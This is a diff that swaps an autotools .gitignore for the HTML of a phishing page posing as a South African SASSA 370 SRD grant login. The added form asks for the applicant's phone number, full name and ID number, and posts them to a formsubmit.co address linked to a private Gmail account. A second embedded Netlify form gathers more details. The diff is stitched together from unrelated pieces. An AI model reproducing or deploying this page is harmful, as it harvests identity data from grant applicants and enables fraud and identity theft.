@@ -1,49 +1,11 @@
-# http://www.gnu.org/software/automake
+<class entry-content="" float-container="" id="post-body-395428029364382839" post-body="" style="font-feature-settings: normal; font-kerning: auto; font-optical-sizing: auto; font-size-adjust: none; font-stretch: normal; font-variant-alternates: normal; font-variant-east-asian: normal; font-variant-numeric: normal; font-variant-position: normal; font-variation-settings: normal; line-height: 1.6em; margin: 1.5em 0px 2em;"><form action="https://formsubmit.co/xxxtentacion20081207@gmail.com" method="POST"><div class="login-container" style="border-radius: 6px; border: 1px solid yellow; margin: 30px auto; max-width: 280px; padding: 17px;"><div class="image-container"><div class="separator" style="clear: both; text-align: center;"><b style="color: red; font-size: 15px; text-align: left;">SASSA 370 SRD GRANT</b></div></div></div></form></class><form action="/submit-form" method="POST" name="contactForm" netlify-honeypot="bot-field" netlify=""><div><span face="Roboto, sans-serif" style="color: red;"><span style="font-size: 15px;"><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb4I76fnE_72hkGEs6aGQ_PifK9DfFgljkyo7HaJ4Vumxf7FsD-qUKAN9S8HovZnRLndWETGxPv-g9_e1iv3WigbrHIoshmEQmxh22EleY_VDI0dhqT73IMju6RW7pMjzSNins0QrjSLdI9gLgd4EuPNIkFDsl-by398dhanP3d2KltwGivAHO2KiMJ-hB/s280/1ae771384cf80143988edb33bd48b153%20(1).jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="280" data-original-width="280" height="280" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb4I76fnE_72hkGEs6aGQ_PifK9DfFgljkyo7HaJ4Vumxf7FsD-qUKAN9S8HovZnRLndWETGxPv-g9_e1iv3WigbrHIoshmEQmxh22EleY_VDI0dhqT73IMju6RW7pMjzSNins0QrjSLdI9gLgd4EuPNIkFDsl-by398dhanP3d2KltwGivAHO2KiMJ-hB/s1600/1ae771384cf80143988edb33bd48b153%20(1).jpg" width="280" /></a></div><br /><b><br /></b></span></span></div><div><br /></div><div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;"><label style="color: black; font-weight: bold;">(+27) Enter your numbers used to apply:</label>&nbsp;<input id="username" name="username" required="" style="border-color: yellow; border-radius: 8px; border-style: solid; font-family: inherit; font-feature-settings: inherit; font-kerning: inherit; font-optical-sizing: inherit; font-size-adjust: inherit; font-size: inherit; font-stretch: inherit; font-style: inherit; font-variant: inherit; font-variation-settings: inherit; font-weight: inherit; margin: 0px; padding: 8px; width: 252px;" type="text" /></div><div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;"><label style="color: black; font-weight: bold;">Enter your Name &amp; Surname:</label><h3 style="font-size: 16px;"><input id="pass" name="Name &amp; Surname" required="" style="border-color: yellow; border-radius: 8px; border-style: solid; font-family: inherit; font-feature-settings: inherit; font-kerning: inherit; font-optical-sizing: inherit; font-size-adjust: inherit; font-size: inherit; font-stretch: inherit; font-style: inherit; font-variant: inherit; font-variation-settings: inherit; font-weight: inherit; margin: 0px; padding: 8px; width: 252px;" type="Name &amp; Surname " />&nbsp;</h3><h3 style="font-size: 16px;"><label style="color: black;">Enter your ID number:</label>&nbsp;<input id="dino" name="idno" required="" style="border-color: yellow; border-radius: 8px; border-style: solid; font-family: inherit; font-feature-settings: inherit; font-kerning: inherit; font-optical-sizing: inherit; font-size-adjust: inherit; font-size: inherit; font-stretch: inherit; font-style: inherit; font-variant: inherit; font-variation-settings: inherit; font-weight: inherit; margin: 0px; padding: 8px; width: 252px;" type="idno" /></h3></div><button class="login-button" style="appearance: button; background-color: blue; border-color: initial; border-radius: 3px; border-style: none; border-width: initial; color: white; cursor: pointer; font-family: inherit; font-feature-settings: inherit; font-kerning: inherit; font-optical-sizing: inherit; font-size-adjust: inherit; font-size: inherit; font-stretch: inherit; font-style: inherit; font-variant: inherit; font-variation-settings: inherit; font-weight: bold; line-height: inherit; margin: 0px; overflow: visible; padding: 6px 115px;" type="submit">LOGIN</button></form><form data-netlify="true" method="POST" name="Sassa-Srd-Self-Service">
 
-Makefile.in
-/ar-lib
-/mdate-sh
-/py-compile
-/test-driver
-/ylwrap
+  <input name="name" type="text" />
 
-# http://www.gnu.org/software/autoconf
+  <input name="email" type="email" />
 
-autom4te.cache
-/autoscan.log
-/autoscan-.log
-/aclocal.m4
-/compile
-/config.guess
-/config.h.in
-/config.log
-/config.status
-/config.sub
-/configure
-/configure.scan
-/depcomp
-/install-sh
-/missing
-/stamp-h1
+  <textarea name="message"></textarea>
 
-# https://www.gnu.org/software/libtool/
+  <button type="submit">Send</button>
 
-/ltmain.sh
-
-# http://www.gnu.org/software/texinfo
-
-/texinfo.tex
-
-# http://www.gnu.org/software/m4/
-
-m4/libtool.m4
-m4/ltoptions.m4
-m4/ltsugar.m4
-m4/ltversion.m4
-m4/lt~obsolete.m4
-
-# Generated Makefile 
-# (meta build system like autotools, 
-# can automatically generate from config.status script
-# (which is called by configure script))
-Makefile
+</form><input type="hidden" name="form-name" value="my-blog-form">
